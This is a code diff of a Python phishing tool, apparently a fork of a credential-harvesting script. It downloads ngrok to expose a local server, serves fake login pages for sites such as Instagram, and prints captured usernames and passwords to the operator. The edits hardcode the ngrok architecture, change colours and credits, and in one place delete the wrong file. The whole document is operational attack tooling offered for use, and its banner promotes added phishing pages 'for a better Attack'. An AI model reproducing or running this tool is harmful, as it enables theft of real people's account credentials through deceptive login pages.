@@ -33,11 +33,10 @@ if connected() == False:
 def checkNgrok():
     if path.isfile('Server/ngrok') == False: 
         print '[*] Downloading Ngrok...'
-        ostype = systemos().lower()
         if architecture()[0] == '64bit':
-            filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
+            filename = 'ngrok-stable-linux-arm.zip'
         else:
-            filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
+            filename = 'ngrok-stable-linux-arm.zip'
         url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
         download(url)
         system('unzip ' + filename)
@@ -57,7 +56,7 @@ def end():
               |/     / / / / / / /             \_   {1}ME !{2}  _)
                           {1}F I S H{2}                ~--___--~
 
- {0}This script was made by Undeadsec_ But I have added some more features in it ]
+ {0}This script was made by UndeadSec_ But I have added some more features in it ]
 
 {1}[ {0} Some more phising pages have been added in script. For a better Attack]
 
@@ -122,13 +121,13 @@ def waitCreds():
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(RED, END) % lines
-            system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
+            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
+            system('rm -rf Server/www/cat.txt && touch Server/www/usernames.txt')
         creds.close()
 
 def runPEnv():
     system('clear')
-    print '''           {2}-{1} https://github.com/An0nUD4Y {2}|{1} AnonUD4Y {2}|{1} https://github.com/An0nUD4Y {2}- INDIA
+    print '''           {2}-{1} An0nUD4Y {2}|{1} An0nUD4Y {2}|{1} An0nUD4Y {2}- INDIA
                           '
                         '   '
                       '       '
@@ -144,7 +143,7 @@ def runPEnv():
                '  .  .  .  .  . '.    .'              '  .
                    '         '    '. '      {1}Updated_By--> AnonUD4Y_{2}    
                      '       '      '             
-                       ' .  '                https://github.com/An0nUD4Y
+                       ' .  '
                            '
                              {1}'''.format(GREEN, END, CYAN)
 
@@ -198,16 +197,13 @@ def runPEnv():
         runPhishing('Instagram', option2)    
     else:  
          exit(0)
-         
-        
-    
 
 def runNgrok():
     system('./Server/ngrok http 8080 > /dev/null &')
     sleep(10)
     system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
-    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, RED, GREEN)
+    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, END, GREEN)
     url.close()
 
 def runServer():
@@ -222,5 +218,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         system('pkill -f ngrok')
         end()
-exit(0)
-
+        exit(0)
